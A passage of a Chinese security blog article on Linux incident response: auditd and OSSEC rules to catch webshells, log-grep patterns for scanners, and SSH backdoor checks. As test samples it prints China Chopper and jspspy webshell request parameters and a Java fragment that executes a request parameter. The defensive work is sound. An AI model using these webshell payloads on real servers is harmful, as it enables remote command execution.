<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <title>[终端安全]Linux应急响应姿势浅谈 - 嘶吼 RoarTalk &#8211; 回归最本质的信息安全,互联网安全新媒体,4hou.com</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta name="renderer" content="webkit">
    <meta property="wb:webmaster" content="4517e8fe39b18975" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,Chrome=1" />
    <meta name="description" content="一、前记无论是甲方还是乙方的同学，应急响应可能都是家常便饭，你可能经常收到如下反馈：&nbsp;&nbsp;运维同事 --&gt; 服务器上存在可疑进程，系统资源占用高；网络同事 --&gt; 监控发现某台服务器对外大量发包；.…" />
    <meta name="keywords" content="linux" />
        <link href="http://img.4hou.com/wp-content/themes/4houv2/images/favicon.ico" rel="shortcut icon">
    <link href="http://img.4hou.com/wp-content/themes/4houv2/images/favicon_114.png" rel="apple-touch-icon">
    <link href="http://img.4hou.com/wp-content/themes/4houv2/images/favicon_76.png" sizes="76x76" rel="apple-touch-icon">
    <link href="http://img.4hou.com/wp-content/themes/4houv2/images/favicon_120.png" sizes="120x120" rel="apple-touch-icon">
    <link href="http://img.4hou.com/wp-content/themes/4houv2/images/favicon_152.png" sizes="152x152" rel="apple-touch-icon">

    <!-- 引入 lib -->
    <script src="http://www.4hou.com/wp-content/themes/4houv2/lib/jquery.min.js"></script>
    <script src="http://www.4hou.com/wp-content/themes/4houv2/lib/swiper.jquery.min.js"></script>
    <link rel="stylesheet" href="http://www.4hou.com/wp-content/themes/4houv2/lib/swiper.min.css">
    <link rel="stylesheet" href="http://www.4hou.com/wp-content/themes/4houv2/lib/allmin.css">
    <!--[if lt IE 11]>
    <script src="http://www.4hou.com/wp-content/themes/4houv2/lib/html5shiv.min.js"></script>
    <script src="http://www.4hou.com/wp-content/themes/4houv2/lib/respond.js"></script>
    <![endif]-->
    <!-- 引入 css js -->
    <link rel="stylesheet" href="http://www.4hou.com/wp-content/themes/4houv2/css/style.css">
    <link rel="stylesheet" href="http://www.4hou.com/wp-content/themes/4houv2/lib/allmin.css">
    <script src="http://www.4hou.com/wp-content/themes/4houv2/js/public.js"></script>
    <script src="http://www.4hou.com/wp-content/themes/4houv2/js/main.js"></script>
    <script src="http://www.4hou.com/wp-content/themes/4houv2/js/index-more.js"></script>
    </head>
<body>
<style type="text/css">
.memberlistanimate{width: 122px}
.memberlistanimateleave{width: 122px}
.nameheader{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width: 78px;display: block;}
</style>

<header class="header">
            <article class="header_center">
                <div class="logowrap">
            <a href="http://www.4hou.com"><div class="logo icons"></div></a>
            <h1>回归最本质的信息安全</h1>
        </div>
        <div class="login">
            <form action="/" class="navbar-form inSearch " name="searchform" onsubmit="return checksubmit()">
                <div class="br">
                    <span class="in-btn icons"></span>
                    <input type="text" name="s" id="search" class="animated">
                    <div class="clear icons"></div>
                </div>
                <div id="submitBtnplace" class="icons animated" value=""></div>
                <!--<input type="submit" id="submitBtn" class="icons animated" value="">-->
            </form>
                            <!--登录注册按钮-->
                 <div id="register">
                     <a href="http://www.4hou.com/register" data-event-category="Referral to Signup" data-event-action="click" data-event-label="Signup Menu button / Header">注册</a>
                 </div>
                 <div id="sing">
                      <a href="http://www.4hou.com/login" class="pzh_login">登录</a>
                 </div>

                 <div class="burger2 menu" id="burger">
                  <div class="icon"></div>
                 </div>

            
           <!-- <div id="register">注册</div>
            <div id="sing">登录</div>
            <div class="burger2 menu" id="burger">
                <div class="icon"></div>
            </div>-->
        </div>
    </article>
</header>
<nav class="navbox animated">
    <section class="navbox_cen">
        <article class="navboxleft">
            <ul class="nav navbar-nav index-nav" id="inNav">
					<li>
							<li class="cat-item cat-item-18"><a href="http://www.4hou.com/category/info" >资讯</a>
</li>
	<li class="cat-item cat-item-19"><a href="http://www.4hou.com/category/technology" >技术</a>
</li>
	<li class="cat-item cat-item-20"><a href="http://www.4hou.com/category/xactivity" >活动</a>
</li>
	<li class="cat-item cat-item-29"><a href="http://www.4hou.com/category/vulnerable" >漏洞</a>
</li>
					</li>
                    <li class="cat-item cat-item-29"><a href="http://www.4hou.com/piao" >嘶票</a>
                    </li>
            </ul>
        </article>
        <article class="navboxright">
            <div class="contrib"> <a href="http://www.4hou.com/contribute" class="tougao" data-event-category="Referral to Signup" data-event-action="click" data-event-label="Signup Menu button / Header">投稿</a></div>
        </article>
    </section>
</nav>
<div id="modelbg"></div>
    <style>


    ::selection {
    background:#fea283;
    color:#fff;
}
::-moz-selection {
    background:#fea283;
    color:#fff;
}
::-webkit-selection {
    background:#fea283;
    color:#fff;
}


        .article_cen p img{height: auto !important;}
        .commentlist .children{width: 90%; padding-right: 15px; border-color: transparent ;}
        .commentname,.commenteml{width: 60%; margin-left:5% ;margin-bottom: 30px;border-bottom: 1px solid #dbdbdb;}
        .article_cen ol li{list-style-type: decimal;}
         .article_cen ol li p{overflow: inherit;}
        .commentname label{font-size: 16px;color: #666; margin-right: 10px;line-height: 32px;}
        .commentname input{width: 50%;border: none; outline: none;}
        .commenteml label{font-size: 16px;color: #666; margin-right: 10px;line-height: 32px;}
        .commenteml input{width: 50%;border: none; outline: none;}
        #zooming{display: none;width: 100%;height: 100%; position: fixed;z-index: 999;left: 0px; top: 0px; background-color: rgba(0,0,0,.6);}
        .zoomaniatae{display: block !important;}
        .imgcon{}
        #imgcon{position: absolute;left: 50%; top: 20%;max-width: 80%}
        .article_cen img{cursor: pointer;}
        #zooming{cursor: pointer;}
        .imgconadimate{animation:imgcon 0.5s 1 forwards;
        -webkit-animation:imgcon 0.5s 1 forwards;}
        .article_authorbox{    width: 222px;min-height: 214px;
        padding-bottom: 20px;
        float: right;
        position: relative;}
        .interested{position: relative;}
        .interested>h1{font-size: 18px; font-weight: 900; position: absolute; top: -36px;color: #5e5e5e}
       .user-comment span{font-size: 13px; position: relative; top: 2px;}
        .article_authoradd{position: fixed;}
        .stratend{background:url(http://www.4hou.com/wp-content/themes/4houv2/img/starend.png); !important;background-size: contain !important;}
        .wpfp-span{opacity: 0;width:100%; height: 100%;display: block; left: 0px; top: 0px; }
        .wpfp-link{width:100%; height: 100%;display: block; left: 0px; top: 0px; }
        .wpfp-span img{display: none;}
        .interested{width: 222px;padding-bottom: 20px;background-color: #fff;margin-top: 70px; padding-bottom: 10px; padding-top: 10px;border: 1px solid #f5c2b1}
        .interested li{width: 100%;position: relative;padding-top: 8px; padding-bottom: 8px;  line-height: 24px; padding-left: 20px;padding-right: 14px}
        .interested li i{width: 6px;height: 6px;border-radius: 50%; background-color: #f63;position: absolute; left: 8px; top: 18px;}
        .interested li a{color: #666;font-size: 14px; line-height: 18px;}
        .interested li:hover{background-color: #f9e7e3;-moz-transition: all 0.4s ease-in-out;
        .footer{position: relative;z-index: 99}   
        .article_authorbox_top{position: relative;} 
        

        -o-transition: all 0.4s ease-in-out; -webkit-transition: all 0.4s ease-in-out; transition: all 0.4s ease-in-out;}
    
        @-webkit-keyframes imgcon{
            0%{ opacity:0; -webkit-transform:scale3d(.3, .3, .3); transform:scale3d(.3, .3, .3) }
            50%{ opacity:1 }
        }
        @keyframes imgcon{
            0%{ opacity:0; -webkit-transform:scale3d(.3, .3, .3); transform:scale3d(.3, .3, .3) }
            50%{ opacity:1 }
        }
        .asideanimate{animation:asideanimate 1s 1 forwards;
        -webkit-animation:asideanimate 1s 1 forwards; position: fixed;}
        @-webkit-keyframes asideanimate{
            0%{ opacity:0; -webkit-transform:translate3d(0,-20%, 0); transform:translate3d(0, -20%, 0) }
            50%{ opacity:1 }
        }
        @keyframes asideanimate{
            0%{ opacity:0; -webkit-transform:translate3d(0,-20%, 0); transform:translate3d(0, -20%, 0) }
            50%{ opacity:1 }
        }
        .asideanimateleave{animation:asideanimateleave 1s 1 forwards;
        -webkit-animation:asideanimateleave 1s 1 forwards;}
        @-webkit-keyframes asideanimateleave{
            0%{ opacity:1; -webkit-transform:translate3d(0,0, 0); transform:translate3d(0, 0, 0) }
            50%{ opacity:0;-webkit-transform:translate3d(0,-20%, 0); transform:translate3d(0, -20%, 0) }
        }
        @keyframes asideanimateleave{
            0%{ opacity:1; -webkit-transform:translate3d(0,0, 0); transform:translate3d(0, 0, 0) }
            50%{ opacity:0;-webkit-transform:translate3d(0,-20%, 0); transform:translate3d(0, -20%, 0) }
        }
        @media screen and (max-width:650px) {
            .member_list{right: -30px !important;top: 34px !important;}
            .article_authorbox{display: none;}
            .nameheader{display: none;}
            .shang_box{width: 90%; margin-left:-45% }
            #imgcon{width: 90% !important; margin-left: -45% !important;max-width: inherit !important}
            .dy{padding: 12px 15px!important;font-size: 14px !important; line-height: 22px !important;}
        }
        .article_author{float:none !important;padding-top: 1px;}
        .article_cen pre{color: #666 !important; line-height: 26px; background-color: #f1f1f1}
        .articlecontent blockquote>p{ color: #666; font-size: 16px; }
    </style>
    <section class="articlewrap">
        <article class="articlecontent">
            <div class="article_top">
                <h1 class="art_title">[终端安全]Linux应急响应姿势浅谈</h1>
                <p class="art_time">2017年10月10日发布</p>
                <div class="art_nav">
                    <!--<a href="">翻译文章</a>
                    <span>／</span>
                    <a href="">新闻</a>
                    <span>／</span>
                    <a href="">原创</a>-->
                                        <a href="http://www.4hou.com">首页 </a></a>
                    <span>／</span>
                    <a href="http://www.4hou.com/category/system">系统安全</a>
                    <span>／</span>
                    <a href="">正文</a>

                    </ul>
                </div>
                <div class="art_type">
                    <div class="newtype">
                        <div class="read ">
                            <i class="icons"></i>
                            <span>27,488</span>
                        </div>
                        <div class="comment ">
                            <i class="icons"></i>
                            <span>0</span>
                        </div>
                        <div class="Praise">
                            <i class="icons"></i>
                            <span>4</span>
                        </div>
                    </div>
                </div>
            </div>
             <p class="dy" style="padding: 24px 60px;font-size: 16px;line-height: 30px;color: #808080;background-color: #f6f6f6;"><span style="font-weight: bold;">导语：</span>当遇到安全应急时，不要着急，喝一杯82年的美年达压压惊，希望本文可以对你有所帮助。</p>

            <div class="article_cen">
                <!--文章摘要-->
               
                <p><p style="text-align: left;"><span style="font-size: 20px;"><strong>一、前记</strong></span></p>
<p style="text-align: left;">无论是甲方还是乙方的同学，应急响应可能都是家常便饭，你可能经常收到如下反馈：&nbsp;&nbsp;<br style="outline: none;"/>运维同事 &#8211;&gt; 服务器上存在可疑进程，系统资源占用高；<br style="outline: none;"/>网络同事 &#8211;&gt; 监控发现某台服务器对外大量发包；<br style="outline: none;"/>&#8230;.<br style="outline: none;"/>不要着急，喝一杯82年的美年达压压惊，希望本文可以对你有所帮助。</p>
<p style="text-align: left;"><span style="font-size: 20px;"><strong>二、排查流程</strong></span></p>
<p style="text-align: left;"><span style="color: rgb(227, 108, 9);"><strong>0x01 Web服务</strong></span></p>
<p style="text-align: left;">一般如果网络边界做好控制，通常对外开放的仅是Web服务，那么需要先找到Webshell，可以通过如下途径：</p>
<p style="text-align: left;">1）检查最近创建的php、jsp文件和上传目录<br style="outline: none;"/>例如要查找24小时内被修改的JSP文件：</p>
<p style="text-align: left;">&gt; find ./ -mtime 0 -name &quot;*.jsp&quot;</p>
<p style="text-align: left;">2）使用Webshell查杀工具<br style="outline: none;"/>&nbsp;&nbsp;&nbsp;&nbsp;Windows下D盾等，Linux下河马等。</p>
<p style="text-align: left;">3）与测试环境目录做对比</p>
<p style="text-align: left;">&gt; diff -r {生产dir} {测试dir}</p>
<p style="text-align: left;">4）创建Audit审计规则</p>
<pre class="brush:html;toolbar:false;">vim&nbsp;/etc/audit/audit.rules
-a&nbsp;exclude,always&nbsp;-F&nbsp;msgtype=CONFIG_CHANGE
-a&nbsp;exit,always&nbsp;-F&nbsp;arch=b64&nbsp;-F&nbsp;uid=48&nbsp;-S&nbsp;execve&nbsp;-k&nbsp;webshell</pre>
<p style="text-align: left;">产生日志如下：</p>
<pre class="brush:html;toolbar:false;">type=SYSCALL&nbsp;msg=audit(1505888691.301:898615):&nbsp;arch=c000003e&nbsp;syscall=59&nbsp;success=yes&nbsp;exit=0&nbsp;a0=ca5188&nbsp;a1=cb5ec8&nbsp;a2=cb5008&nbsp;a3=8&nbsp;items=2&nbsp;ppid=26159&nbsp;pid=26160&nbsp;auid=0&nbsp;uid=48&nbsp;gid=48&nbsp;euid=48&nbsp;suid=48&nbsp;fsuid=48&nbsp;egid=48&nbsp;sgid=48&nbsp;fsgid=48&nbsp;tty=(none)&nbsp;ses=120028&nbsp;comm=&quot;ls&quot;&nbsp;exe=&quot;/bin/ls&quot;&nbsp;subj=unconfined_u:system_r:httpd_t:s0&nbsp;key=&quot;webshell&quot;
type=EXECVE&nbsp;msg=audit(1505888691.301:898615):&nbsp;argc=1&nbsp;a0=&quot;ls&quot;
type=CWD&nbsp;msg=audit(1505888691.301:898615):&nbsp;cwd=&quot;/var/www/html/dvwa&quot;
type=PATH&nbsp;msg=audit(1505888691.301:898615):&nbsp;item=0&nbsp;name=&quot;/bin/ls&quot;&nbsp;inode=2359385&nbsp;dev=fd:00&nbsp;mode=0100755&nbsp;ouid=0&nbsp;ogid=0&nbsp;rdev=00:00&nbsp;obj=system_u:object_r:bin_t:s0&nbsp;nametype=NORMAL
type=PATH&nbsp;msg=audit(1505888691.301:898615):&nbsp;item=1&nbsp;name=(null)&nbsp;inode=1441842&nbsp;dev=fd:00&nbsp;mode=0100755&nbsp;ouid=0&nbsp;ogid=0&nbsp;rdev=00:00&nbsp;obj=system_u:object_r:ld_so_t:s0&nbsp;nametype=NORMAL</pre>
<p style="text-align: left;">可以看到所在目录为/var/www/html/dvwa</p>
<p style="text-align: left;"><strong>具体Auditd的使用如下：</strong></p>
<p style="text-align: left;">Auditd服务介绍</p>
<p style="text-align: left;">Auditd服务是Linux自带的审计系统，用来记录审计信息，从安全的角度可以用于对系统安全事件的监控。<br style="outline: none;"/>Auditd服务的配置文件位于/etc/audit/audit.rules，其中每个规则和观察器必须单独在一行中。语法如下：</p>
<pre class="brush:html;toolbar:false;">-a&nbsp;&lt;list&gt;,&lt;action&gt;&nbsp;&lt;options&gt;</pre>
<p style="text-align: left;">&lt;list&gt;配置如下：</p>
<pre class="brush:html;toolbar:false;">task
每个任务的列表。只有当创建任务时才使用。只有在创建时就已知的字段(比如UID)才可以用在这个列表中。
entry
系统调用条目列表。当进入系统调用确定是否应创建审计时使用。
exit
系统调用退出列表。当退出系统调用以确定是否应创建审计时使用。
user
用户消息过滤器列表。内核在将用户空间事件传递给审计守护进程之前使用这个列表过滤用户空间事件。有效的字段只有uid、auid、gid和pid。
exclude
事件类型排除过滤器列表。用于过滤管理员不想看到的事件。用msgtype字段指定您不想记录到日志中的消息。</pre>
<p style="text-align: left;">&lt;action&gt;配置如下：</p>
<pre class="brush:html;toolbar:false;">never
不生成审计记录。
always
分配审计上下文，总是把它填充在系统调用条目中，总是在系统调用退出时写一个审计记录。如果程序使用了这个系统调用，则开始一个审计记录。</pre>
<p style="text-align: left;">&lt;options&gt;配置如下：</p>
<pre class="brush:html;toolbar:false;">-S&nbsp;&lt;syscall&gt;
根据名称或数字指定一个系统。要指定所有系统调用，可使用all作为系统调用名称。
-F&nbsp;&lt;name[=,!=,&lt;,&gt;,&lt;=]value&gt;
指定一个规则字段。如果为一个规则指定了多个字段，则只有所有字段都为真才能启动一个审计记录。每个规则都必须用-F启动，最多可以指定64个规则。
常用的字段如下：
pid
进程ID。
ppid
父进程的进程ID。
uid
用户ID。
gid
组ID。
msgtype
消息类型号。只应用在排除过滤器列表上。
arch
系统调用的处理器体系结构。指定精确的体系结构，比如i686(可以通过uname&nbsp;-m命令检索)或者指定b32来使用32位系统调用表，或指定b64来使用64位系统调用表。
...</pre>
<p style="text-align: left;"><strong>编写测试Java命令监控规则</strong></p>
<p style="text-align: left;">Jboss的启动账户为nobody，添加审计规则</p>
<pre class="brush:html;toolbar:false;">#&nbsp;grep&nbsp;&#39;-a&#39;&nbsp;/etc/audit/audit.rules&nbsp;
-a&nbsp;exclude,always&nbsp;-F&nbsp;msgtype=CONFIG_CHANGE
-a&nbsp;exit,always&nbsp;-F&nbsp;arch=b32&nbsp;-F&nbsp;uid=99&nbsp;-S&nbsp;execve&nbsp;-k&nbsp;webshell</pre>
<p style="text-align: left;">重启服务</p>
<pre class="brush:html;toolbar:false;">#&nbsp;service&nbsp;auditd&nbsp;restart
Stopping&nbsp;auditd:&nbsp;[&nbsp;OK&nbsp;]
Starting&nbsp;auditd:&nbsp;[&nbsp;OK&nbsp;]</pre>
<p style="text-align: left;">使用webshell测试：<br style="outline: none;"/>1）菜刀马测试<br style="outline: none;"/>菜刀马传递的参数为</p>
<pre class="brush:html;toolbar:false;">tom=M&amp;z0=GB2312&amp;z1=-c/bin/sh&amp;z2=cd&nbsp;/;whoami;echo&nbsp;[S];pwd;echo&nbsp;[E]</pre>
<p style="text-align: left;">所执行的程序如下：</p>
<pre class="brush:html;toolbar:false;">else&nbsp;if(Z.equals(&quot;M&quot;)){String[]&nbsp;c={z1.substring(2),z1.substring(0,2),z2};Process&nbsp;p=Runtime.getRuntime().exec(c);</pre>
<p style="text-align: left;">审计日志如下：</p>
<pre class="brush:html;toolbar:false;">type=EXECVE&nbsp;msg=audit(1500273887.809:7496):&nbsp;argc=3&nbsp;a0=&quot;/bin/sh&quot;&nbsp;a1=&quot;-c&quot;&nbsp;a2=6364202F7765622F70726F6A6563742F7A616F6A69617379732E6A69616E73686539392E636F6D2E636563616F707379732F636563616F707379732F3B77686F616D693B6563686F205B535D3B7077643B6563686F205B455D</pre>
<p style="text-align: left;">2）jspspy测试<br style="outline: none;"/>jspspy传递的参数为</p>
<pre class="brush:html;toolbar:false;">o=shell&amp;type=command&amp;command=netstat+-antlp&amp;submit=Execute</pre>
<p style="text-align: left;">所执行的程序如下：</p>
<pre class="brush:html;toolbar:false;">String&nbsp;type&nbsp;=&nbsp;request.getParameter(&quot;type&quot;);
if&nbsp;(type.equals(&quot;command&quot;))&nbsp;{
ins.get(&quot;vs&quot;).invoke(request,response,JSession);
out.println(&quot;&lt;div&nbsp;style=&#39;margin:10px&#39;&gt;&lt;hr/&gt;&quot;);
out.println(&quot;&lt;pre&gt;&quot;);
String&nbsp;command&nbsp;=&nbsp;request.getParameter(&quot;command&quot;);
if&nbsp;(!Util.isEmpty(command))&nbsp;{
Process&nbsp;pro&nbsp;=&nbsp;Runtime.getRuntime().exec(command);
BufferedReader&nbsp;reader&nbsp;=&nbsp;new&nbsp;BufferedReader(new&nbsp;InputStreamReader(pro.getInputStream()));
String&nbsp;s&nbsp;=&nbsp;reader.readLine();</pre>
<p style="text-align: left;">审计日志如下：</p>
<pre class="brush:html;toolbar:false;">type=EXECVE&nbsp;msg=audit(1500273958.180:7500):&nbsp;argc=1&nbsp;a0=&quot;whoami&quot;</pre>
<p style="text-align: left;"><strong>&nbsp;OSSEC监控配置</strong></p>
<p style="text-align: left;">OSSEC本身已经包含了auditd事件的解码规则，例如：</p>
<pre class="brush:html;toolbar:false;">&lt;decoder&nbsp;name=&quot;auditd&quot;&gt;
&nbsp;&nbsp;&lt;prematch&gt;^type=&lt;/prematch&gt;
&lt;/decoder&gt;
.......</pre>
<p style="text-align: left;">但是在RULES里面没有找到现成的规则，编辑local_rules.xml，新增</p>
<pre class="brush:html;toolbar:false;">&lt;group&nbsp;name=&quot;syslog,auditd,&quot;&gt;
&nbsp;&nbsp;&lt;rule&nbsp;id=&quot;110000&quot;&nbsp;level=&quot;0&quot;&nbsp;noalert=&quot;1&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;decoded_as&gt;auditd&lt;/decoded_as&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;description&gt;AUDITD&nbsp;messages&nbsp;grouped.&lt;/description&gt;
&nbsp;&nbsp;&lt;/rule&gt;
&nbsp;&nbsp;&lt;rule&nbsp;id=&quot;110001&quot;&nbsp;level=&quot;10&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;if_sid&gt;110000&lt;/if_sid&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;match&gt;EXECVE&lt;/match&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;description&gt;Java&nbsp;execution&nbsp;command&lt;/description&gt;
&nbsp;&nbsp;&lt;/rule&gt;
&lt;/group&gt;</pre>
<p style="text-align: left;">测试</p>
<pre class="brush:html;toolbar:false;">[root@localhost&nbsp;ossec]#&nbsp;./bin/ossec-logtest&nbsp;
2017/07/17&nbsp;16:28:26&nbsp;ossec-testrule:&nbsp;INFO:&nbsp;Reading&nbsp;local&nbsp;decoder&nbsp;file.
2017/07/17&nbsp;16:28:26&nbsp;ossec-testrule:&nbsp;INFO:&nbsp;Started&nbsp;(pid:&nbsp;9463).
ossec-testrule:&nbsp;Type&nbsp;one&nbsp;log&nbsp;per&nbsp;line.
type=EXECVE&nbsp;msg=audit(1500273958.180:7500):&nbsp;argc=1&nbsp;a0=&quot;whoami&quot;
**Phase&nbsp;1:&nbsp;Completed&nbsp;pre-decoding.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;full&nbsp;event:&nbsp;&#39;type=EXECVE&nbsp;msg=audit(1500273958.180:7500):&nbsp;argc=1&nbsp;a0=&quot;whoami&quot;&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hostname:&nbsp;&#39;localhost&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;program_name:&nbsp;&#39;(null)&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;log:&nbsp;&#39;type=EXECVE&nbsp;msg=audit(1500273958.180:7500):&nbsp;argc=1&nbsp;a0=&quot;whoami&quot;&#39;
**Phase&nbsp;2:&nbsp;Completed&nbsp;decoding.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;decoder:&nbsp;&#39;auditd&#39;
**Phase&nbsp;3:&nbsp;Completed&nbsp;filtering&nbsp;(rules).
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Rule&nbsp;id:&nbsp;&#39;110001&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Level:&nbsp;&#39;10&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Description:&nbsp;&#39;Java&nbsp;execution&nbsp;command&#39;
**Alert&nbsp;to&nbsp;be&nbsp;generated.</pre>
<p style="text-align: left;">然后在Agent端添加监控文件</p>
<pre class="brush:html;toolbar:false;">&nbsp;&nbsp;&lt;localfile&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;log_format&gt;syslog&lt;/log_format&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;location&gt;/var/log/audit/audit.log&lt;/location&gt;
&nbsp;&nbsp;&lt;/localfile&gt;</pre>
<p style="text-align: left;">然后jspspy执行系统命令，可以看到告警如下</p>
<pre class="brush:html;toolbar:false;">[root@localhost&nbsp;ossec]#&nbsp;tail&nbsp;-f&nbsp;/var/ossec/logs/alerts/alerts.log&nbsp;
**&nbsp;Alert&nbsp;1500280231.400419:&nbsp;mail&nbsp;&nbsp;-&nbsp;syslog,auditd,
2017&nbsp;Jul&nbsp;17&nbsp;16:30:31&nbsp;(agent-31)&nbsp;10.110.1.31-&gt;/var/log/audit/audit.log
Rule:&nbsp;110001&nbsp;(level&nbsp;10)&nbsp;-&gt;&nbsp;&#39;Java&nbsp;execution&nbsp;command&#39;
type=EXECVE&nbsp;msg=audit(1500280229.507:7665):&nbsp;argc=1&nbsp;a0=&quot;pwd&quot;</pre>
<p style="text-align: left;">这里还需考虑的一个问题是白名单，例如公司的一些站点本身就会调用视频处理的一些功能，也会调用系统命令。所以为了避免误报，需要新增一个白名单功能。<br style="outline: none;"/>这里我们修改一下local_rules.xml，新增白名单规则，并且放到EXECVE规则上面。</p>
<pre class="brush:html;toolbar:false;">&lt;group&nbsp;name=&quot;syslog,auditd,&quot;&gt;
&nbsp;&nbsp;&lt;rule&nbsp;id=&quot;110000&quot;&nbsp;level=&quot;0&quot;&nbsp;noalert=&quot;1&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;decoded_as&gt;auditd&lt;/decoded_as&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;description&gt;AUDITD&nbsp;messages&nbsp;grouped.&lt;/description&gt;
&nbsp;&nbsp;&lt;/rule&gt;
&nbsp;&nbsp;&lt;rule&nbsp;id=&quot;110001&quot;&nbsp;level=&quot;0&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;if_sid&gt;110000&lt;/if_sid&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;regex&gt;whoami|passwd&lt;/regex&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;description&gt;Java&nbsp;execution&nbsp;white&nbsp;list&lt;/description&gt;
&nbsp;&nbsp;&lt;/rule&gt;
&nbsp;&nbsp;&lt;rule&nbsp;id=&quot;110002&quot;&nbsp;level=&quot;10&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;if_sid&gt;110000&lt;/if_sid&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;match&gt;EXECVE&lt;/match&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;description&gt;Java&nbsp;execution&nbsp;command&lt;/description&gt;
&nbsp;&nbsp;&lt;/rule&gt;
&lt;/group&gt;</pre>
<p style="text-align: left;">如上所示，执行whoami和cat /etc/passwd的时候不会产生告警。</p>
<p style="text-align: left;"><strong>其他</strong></p>
<p style="text-align: left;">如果没有通过上述途径找到Webshell，可以通过Access Log获取一些信息。<br style="outline: none;"/>1）扫描特征<br style="outline: none;"/>通常日志中会伴随一些其他攻击特征，例如可以用如下语句</p>
<pre class="brush:html;toolbar:false;">egrep&nbsp;&#39;(select|script|acunetix|sqlmap)&#39;&nbsp;/var/log/httpd/access_log</pre>
<p style="text-align: left;">2）访问频次<br style="outline: none;"/>重点关注POST请求</p>
<pre class="brush:html;toolbar:false;">grep&nbsp;&#39;POST&#39;&nbsp;/var/log/httpd/access_log&nbsp;|&nbsp;awk&nbsp;&#39;{print&nbsp;$1}&#39;&nbsp;|&nbsp;sort&nbsp;|&nbsp;uniq&nbsp;-c&nbsp;|&nbsp;sort&nbsp;-nr</pre>
<p style="text-align: left;">3）Content-Length<br style="outline: none;"/>Content-Length过大的请求，例如过滤Content-Length大于5M的日志</p>
<pre class="brush:html;toolbar:false;">awk&nbsp;&#39;{if($10&gt;5000000){print&nbsp;$0}}&#39;&nbsp;/var/log/httpd/access_log</pre>
<p style="text-align: left;">注意<br style="outline: none;"/>这里如果发现文件，不要直接用vim查看编辑文件内容，这样会更改文件的mtime，而对于应急响应来说，时间点很重要。对比时间点更容易在Log找到其他的攻击痕迹。</p>
<p style="text-align: left;"><span style="color: rgb(227, 108, 9);"><strong>0x02 SSH服务</strong></span></p>
<p style="text-align: left;">查看登录信息</p>
<p style="text-align: left;">登录成功：</p>
<pre class="brush:html;toolbar:false;">grep&nbsp;&#39;Accepted&#39;&nbsp;/var/log/secure&nbsp;|&nbsp;awk&nbsp;&#39;{print&nbsp;$11}&#39;&nbsp;|&nbsp;sort&nbsp;|&nbsp;uniq&nbsp;-c&nbsp;|&nbsp;sort&nbsp;-nr</pre>
<p style="text-align: left;">或者last命令，它会读取位于/var/log/wtmp的文件，并把该文件记录的登录系统的用户名单，全部显示出来。</p>
<p style="text-align: left;">登录失败：</p>
<pre class="brush:html;toolbar:false;">grep&nbsp;&#39;Failed&#39;&nbsp;/var/log/secure&nbsp;|&nbsp;awk&nbsp;&#39;{print&nbsp;$11}&#39;&nbsp;|&nbsp;sort&nbsp;|&nbsp;uniq&nbsp;-c&nbsp;|&nbsp;sort&nbsp;-nr</pre>
<p style="text-align: left;">或者lastb命令，会读取位于/var/log/btmp的文件，并把该文件记录的登入系统失败的用户名单，全部显示出来。</p>
<p style="text-align: left;">检查SSH后门<br style="outline: none;"/>1）比对ssh的版本</p>
<p style="text-align: left;">&gt; ssh -V</p>
<p style="text-align: left;">2）查看ssh配置文件和/usr/sbin/sshd的时间</p>
<p style="text-align: left;">&gt; stat /usr/sbin/sshd</p>
<p style="text-align: left;">3）strings检查/usr/sbin/sshd，看是否有邮箱信息<br style="outline: none;"/>strings可以查看二进制文件中的字符串，在应急响应中是十分有用的。有些sshd后门会通过邮件发送登录信息，通过strings /usr/sbin/sshd可以查看到邮箱信息。<br style="outline: none;"/>4）通过strace监控sshd进程读写文件的操作<br style="outline: none;"/>一般的sshd后门都会将账户密码记录到文件，可以通过strace进程跟踪到ssh登录密码文件。</p>
<pre class="brush:html;toolbar:false;">ps&nbsp;axu&nbsp;|&nbsp;grep&nbsp;sshd&nbsp;|&nbsp;grep&nbsp;-v&nbsp;grep
root&nbsp;65530&nbsp;0.0&nbsp;0.1&nbsp;48428&nbsp;1260&nbsp;?&nbsp;Ss&nbsp;13:43&nbsp;0:00&nbsp;/usr/sbin/sshd
strace&nbsp;-o&nbsp;aa&nbsp;-ff&nbsp;-p&nbsp;65530
grep&nbsp;open&nbsp;aa*&nbsp;|&nbsp;grep&nbsp;-v&nbsp;-e&nbsp;No&nbsp;-e&nbsp;null&nbsp;-e&nbsp;denied|&nbsp;grep&nbsp;WR
aa.102586:open(&quot;/tmp/ilog&quot;,&nbsp;O_WRONLY|O_CREAT|O_APPEND,&nbsp;0666)&nbsp;=&nbsp;4</pre>
<p style="text-align: left;"><span style="color: rgb(227, 108, 9);"><strong>0x03 进程</strong></span></p>
